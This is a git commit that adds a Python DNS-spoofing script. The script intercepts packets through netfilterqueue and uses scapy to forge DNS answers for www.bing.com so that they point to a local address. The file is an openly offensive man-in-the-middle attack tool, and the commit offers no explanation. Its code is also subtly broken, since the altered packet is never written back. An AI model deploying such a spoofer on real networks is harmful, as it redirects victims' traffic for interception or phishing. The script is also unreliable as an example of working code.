cc6537e34c7c69e8e8b17fe6fdb825f24ea30a8e
Abhay-Mahanta <abhay.17189@sakec.ac.in>
2024-08-12 15:25:13 +0530

    Add files via upload

---
+++ dns_spoofer.py
@@ -0,0 +1,26 @@
+#!/usr/bin/env python
+
+import netfilterqueue
+import scapy.all as scapy
+
+def process_packet(packet):
+	scapy_packet = scapy.IP(packet.get_payload())
+	if scapy_packet.haslayer(scapy.DNSRR):
+		qname = str(scapy_packet[scapy.DNSQR].qname)
+		if "www.bing.com" in qname:
+			print("[+] Spoofing target..")
+			print(scapy_packet.show())
+			answer = scapy.DNSRR(rrname = qname, rdata = "192.168.92.133")
+			scapy_packet[scapy.DNS].an = answer
+			scapy_packet[scapy.DNS].ancount = 1
+			
+			del scapy_packet[scapy.IP].len
+			del scapy_packet[scapy.IP].chksum
+			del scapy_packet[scapy.UDP].len
+			del scapy_packet[scapy.UDP].chksum
+			
+	packet.accept()
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
